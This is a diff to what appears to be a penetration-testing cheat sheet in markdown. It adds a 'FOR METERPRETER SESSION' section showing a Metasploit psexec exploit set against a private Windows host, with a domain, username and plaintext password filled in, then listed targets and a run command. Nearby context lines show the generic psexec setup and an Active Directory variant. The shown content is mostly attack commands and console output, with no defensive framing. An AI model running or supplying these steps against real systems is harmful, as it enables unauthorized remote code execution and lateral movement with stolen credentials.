@@ -52,6 +52,28 @@ set smbuser user
 set smbpass pass
 exploit
 ```
+# <h3> FOR METERPRETER SESSION </h3> 
+```
+use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > setg rhost 10.10.110.200
+msf6 exploit(windows/smb/psexec) > setg SMBDomain mgmotor.ad.com
+msf6 exploit(windows/smb/psexec) > setg smbpass Pass@1234
+msf6 exploit(windows/smb/psexec) > setg smbuser 9000
+msf6 exploit(windows/smb/psexec) > show targets 
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Automatic
+    1   PowerShell
+    2   Native upload
+    3   MOF upload
+    4   Command
+
+msf6 exploit(windows/smb/psexec) > run
+```
 # <h3> If AD Implemented. </h3>
 ```
 set SMBDomain ADDomain 
